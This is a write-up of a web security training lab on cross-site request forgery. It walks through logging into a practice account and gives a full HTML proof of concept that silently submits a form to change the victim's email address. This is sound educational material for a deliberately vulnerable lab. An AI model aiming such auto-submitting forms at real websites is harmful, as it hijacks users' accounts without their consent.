# Lab 1 : CSRF with no defenses

**Creds** - **wiener:peter**

**Functionality**: After logging in, the user can change their own email address.

**Task**: Use the exploit server to modify the user's email address by exploiting the CSRF vulnerability. In this case, Wiener's email address.

You can log in to your own account using the following credentials: wiener:peter

1- Login to your account using the given credentials (wiener:peter)

![image.png](image.png)

- Logging in

![image.png](image%201.png)

- Logged in as wiener

![image.png](image%202.png)

- Changed email to test@test.com

![image.png](image%203.png)

- Email changed for user

![image.png](image%204.png)

- The task is to change all the user’s email who visits this vulnerable site.

**Exploit Server**

![image.png](image%205.png)

**Generating a CSRF POC to change user’s email address**

```jsx
<html>
  <body>
    <form action="https://0a4700db04b022eb800a0d7f0013004f.web-security-academy.net/email/change" method="POST">
      <input type="hidden" name="email" value="changedemail@test.com" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

**What it does?**

- Any user who visits this page will trigger an email change request to the vulnerable website resulting in an email change of the user.

Click on Store and Deliver exploit to victim to solve the lab.

![image.png](image%206.png)

**What happens?**

- On hosting the site, the form action triggers, and it changes the user’s email address - in this case, the wiener’s email address.

